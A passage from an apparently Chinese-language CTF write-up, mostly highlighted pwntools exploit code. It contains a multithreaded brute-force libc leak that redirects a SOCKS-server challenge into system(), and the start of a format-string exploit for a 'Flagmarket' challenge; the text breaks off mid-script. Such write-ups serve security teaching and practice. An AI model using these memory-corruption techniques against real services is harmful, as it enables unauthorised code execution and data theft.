style="color:#666666">:</span><br><span style="color:#CB7676">    global</span><span style="color:#DBD7CAEE"> sol</span><br><span style="color:#DBD7CAEE">    current_sol </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> sol</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> byte_range</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> byte_found_event</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">is_set</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><br><br><span style="color:#DBD7CAEE">        m </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> current_sol </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">j</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> sock</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">m</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            with</span><span style="color:#DBD7CAEE"> sol_lock</span><span style="color:#666666">:</span><br><span style="color:#4D9375">                if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sol</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> ==</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">current_sol</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                    sol </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">j</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                    info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Found byte => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">j</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                    byte_found_event</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">set</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            return</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> brute</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">num_threads</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">32</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#CB7676">    global</span><span style="color:#DBD7CAEE"> sol</span><br><span style="color:#DBD7CAEE">    sol </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span><br><br><span style="color:#DBD7CAEE">    info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Bruting first byte...</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">256</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> j </span><span style="color:#CB7676">%</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 9</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            m </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">j</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><br><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> sock</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">m</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                sol </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">j</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Found first byte => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">j</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">                break</span><br><br><span style="color:#4D9375">    if</span><span style="color:#CB7676"> not</span><span style="color:#DBD7CAEE"> sol</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        error</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Failed to brute the first byte.</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#4C9A91"> 0</span><br><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Bruting byte position </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">..."</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        byte_found_event</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">clear</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        threads </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">        chunk_size </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 256</span><span style="color:#CB7676"> //</span><span style="color:#DBD7CAEE"> num_threads</span><br><br><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> t_id </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">num_threads</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            start_byte </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> t_id </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> chunk_size</span><br><span style="color:#DBD7CAEE">            start_byte </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> t_id </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> start_byte</span><br><span style="color:#DBD7CAEE">            end_byte </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 256</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> t_id </span><span style="color:#CB7676">==</span><span style="color:#DBD7CAEE"> num_threads </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#4D9375"> else</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">t_id </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE"> chunk_size</span><br><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> start_byte </span><span style="color:#CB7676">></span><span style="color:#CB7676">=</span><span style="color:#DBD7CAEE"> end_byte</span><span style="color:#666666">:</span><br><span style="color:#4D9375">                continue</span><br><span style="color:#DBD7CAEE">            thread </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> threading</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Thread</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">target</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">brute_worker</span><span style="color:#666666">,</span><span style="color:#BD976A"> args</span><span style="color:#666666">=</span><span style="color:#4d9375">(</span><span style="color:#B8A965">range</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">start_byte</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> end_byte</span><span style="color:#d4976c">)</span><span style="color:#666666">,</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            threads</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">thread</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            thread</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">start</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> thread </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> threads</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            thread</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    final_sol </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> sol</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">final_sol</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> res</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> run_tasks_in_batches</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tasks</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> max_threads</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">16</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#B8A965"> len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">tasks</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> max_threads</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        batch </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> tasks</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE">i</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">max_threads</span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> t </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> batch</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            t</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">start</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> t </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> batch</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            t</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> parallel_add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> max_threads</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Starting </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">count</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> parallel add requests (max </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">max_threads</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> threads at a time)..."</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    tasks </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">threading</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Thread</span><span style="color:#4d9375">(</span><span style="color:#BD976A">target</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">add</span><span style="color:#666666">,</span><span style="color:#BD976A"> args</span><span style="color:#666666">=</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#666666">,</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> _ </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    run_tasks_in_batches</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tasks</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> max_threads</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Parallel add requests finished.</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> parallel_add_delete</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> add_content</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> delete_content</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> max_threads</span><span style="color:#CB7676">=</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Starting </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">count</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> parallel add/delete requests (max </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">max_threads</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> threads at a time)..."</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> worker</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">add_content</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        delete</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">delete_content</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    tasks </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">threading</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Thread</span><span style="color:#4d9375">(</span><span style="color:#BD976A">target</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">worker</span><span style="color:#4d9375">)</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> _ </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    run_tasks_in_batches</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tasks</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> max_threads</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Parallel add/delete requests finished.</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#4D9375">if</span><span style="color:#B8A965"> __name__</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">__main__</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    addr </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000405050</span><br><br><span style="color:#DBD7CAEE">    parallel_add</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">flat</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 103</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> addr </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 1</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    add</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    reset</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    parallel_add_delete</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">c</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">b</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">flat</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 102</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Leaking libc address...</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    leaked_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> brute</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">num_threads</span><span style="color:#666666">=</span><span style="color:#4C9A91">16</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> leaked_addr </span><span style="color:#CB7676">==</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        error</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Failed to leak address.</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">        exit</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> leaked_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">127900</span><br><span style="color:#DBD7CAEE">    info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc base => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">address</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"system addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#d9739f">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#d9739f">]</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    reset</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    parallel_add</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">flat</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 102</span><span style="color:#666666">,</span><span style="color:#CB7676"> -0x</span><span style="color:#4C9A91">104</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#d9739f">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#d9739f">]</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 1</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    add</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">x</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Triggering system()...</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pwn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> SOCK5Pwn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">system</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        success</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Command executed! Check for the flag.</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pwn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> SOCK5Pwn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read_flag</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>由于远程环境 10s 重启一次 sockserver，因此需要打快点，这里用多线程加速爆破。</p>
<h2 id="flagmarket" class="scroll-target"><a href="#flagmarket"><code class="hash inline-code">#</code>Flagmarket</a></h2>
<p>由于格式化字符串存在 bss 上，而 bss 上存在溢出写，所以可以修改格式化字符串的内容，那么只需要每次 pay 的 Money 都不是 255 就可以无限 fmt，而 flag 又是读在堆上的，所以一次泄漏堆地址，然后读入 flag 地址再用 <code class="inline-code">%s</code> 打印即可。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">./chall</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">exit</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">?</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">255</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">opened user.log, please report:</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">q</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#B56959">%9$p%12$s</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">exit</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">1</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">?</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># gdb.attach(p, 'b *0x4014bc')</span><br><span style="color:#393A34">p</span><span 